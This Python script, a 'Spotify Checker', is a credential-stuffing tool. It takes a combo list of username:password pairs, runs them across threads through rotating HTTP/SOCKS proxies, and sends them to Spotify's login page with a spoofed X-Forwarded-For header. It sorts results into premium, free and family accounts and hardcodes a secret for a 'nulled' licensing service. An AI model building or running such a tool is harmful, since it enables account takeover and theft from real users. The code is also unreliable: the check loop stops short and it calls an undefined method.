from proxys import Handler
from auth import Auth
import ctypes
import os
import easygui
from colorama import Fore, init
import collections
import threading
import requests


# {"id":1196019,"name":"raskos-spotify","secret":"IT1J672Y6G7H2NCYNUIIMCTJV67PH1SF"}

version = 1.0

ctypes.windll.kernel32.SetConsoleTitleW(f"Spotify Checker {version} | Rasko1 | 801690-")

init()


def error(msg, title = "Warning!"):
    ctypes.windll.user32.MessageBoxW(0, msg, title, 16)


def limpiar():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def carpeta(*args):
    for carp in args:
        try:
            os.makedirs(carp)
        except FileExistsError:
            pass


nulled = ""
while not nulled:
    nulled = input("Input your nulled auth: ")
    limpiar()


Auth(nulled, "1196019", "IT1J672Y6G7H2NCYNUIIMCTJV67PH1SF")
au = Auth.check()
if au != True:
    error("Wrong Auth")
    exit()


limpiar()


class Checker:
    def __init__(self, proxy_object):
        if not proxy_object:
            self.proxyless = True
        else:
            if len(proxy_object) > 1:
                self.proxyless = False
                self.proxy = proxy_object
            else:
                print(Fore.CYAN + "Checker is going proxyless, since 1 or less proxies were found")
                input()
                self.proxyless = True
        self.th = 0
        self.ask()
        self.select_combo()
        self.r = threading.RLock()
        self.retries = 0
        self.bad = 0
        self.free = 0
        self.premium = 0
        self.family_owners = 0
        self.hits = 0
        limpiar()
        th = []
        for i in range(self.th):
            t = threading.Thread(target=self.spotify)
            th.append(t)
            t.start()
        for j in th:
            j.join()

    def ask(self):
        limpiar()
        print(Fore.CYAN + "How many threads do you want to run? ",end="")
        try:
            self.th = int(input(""))
        except ValueError:
            return self.ask()

    def load_combo(self):
        combo_file = easygui.fileopenbox(title="Select your combo", filetypes="*.txt")
        try:
            if ".txt" in combo_file:
                with open(combo_file, encoding="utf-8") as f:
                    filec = f.read().split("\n")
                new_combo = []
                for y in filec:
                    new_combo.append(y.split(" ")[0])
                self.combo = [z for z in new_combo if z != "" and ":" in z]
                self.combo = list(dict.fromkeys(self.combo))
                self.combo = collections.deque(self.combo)
            else:
                return self.load_combo()
        except:
            return self.load_combo()

    def spotify(self):
        while self.combo:
            with requests.session() as s:
                self.r.acquire()
                acc = self.combo.pop()
                if not self.proxyless:
                    pro = self.proxy.give_proxy()
                    s.proxies.update(pro)
                    self.r.release()
                try:
                    login = s.get("https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2",
                                  headers={"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
                                           "Pragma": "no-cache",
                                           "Accept": "*/*",
                                           "X-Forwarded-For": "127.0.0.1"})
                except:
                    continue
                if login.status_code == 429:
                    self.r.acquire()
                    self.combo.append(acc)
                    if not self.proxyless:
                        pro.ban()
                    self.r.release()

                elif login.status_code == 503:
                    self.r.acquire()
                    self.combo.append(acc)
                    self.retries += 1
                    self.r.release()
                    continue















respuesta = ""
while respuesta not in ("1","2","3","4"):
    print(Fore.GREEN + "[1]Http [2]Socks4 [3]Socks5 [4]Proxyless ", end="")
    respuesta = input()

if respuesta in ("1","2","3"):
    proxies =  Handler()
    if respuesta == "1":
        respuesta = "http"
    elif respuesta == "2":
        respuesta = "socks4"
    elif respuesta == "3":
        respuesta = "socks5"
    limpiar()
    respuesta2 = ""
    while respuesta2 not in ("1", "2"):
        print(Fore.YELLOW + "[1]Scrape proxies [2]Load them from a .txt ", end="")
        respuesta2 = input("")
    if respuesta2 == "1":
        c = proxies.grab(respuesta)
        if not c:
            print(Fore.CYAN + "Proxies could not be scraped\n proxyscrape may be having problems")
            input()
            exit()
        limpiar()
        print(Fore.GREEN + len(str(proxies)), end="")
        print(Fore.GREEN + " were scrapped")
        check = Checker(True)
    else:
        done = False
        p_list = ""
        while not done:
            proxies_file = easygui.fileopenbox(title="Select your proxies", filetypes="*.txt")
            try:
                if ".txt" in proxies_file:
                    with open(proxies_file, encoding="utf-8") as f:
                        file = f.read().split("\n")
                    new_proxies = []
                    for x in file:
                        new_proxies.append(x.split(" ")[0])
                    p_list = [x for x in new_proxies if x != "" and ":" in x]
                    p_list = list(dict.fromkeys(p_list))
                    done = True
            except:
                pass
        proxies.start(p_list, respuesta)
        limpiar()
        print(Fore.GREEN + len(str(proxies)), end="")
        print(Fore.GREEN + " were loaded")
        check = Checker(proxies)
else:
    check = Checker(False)





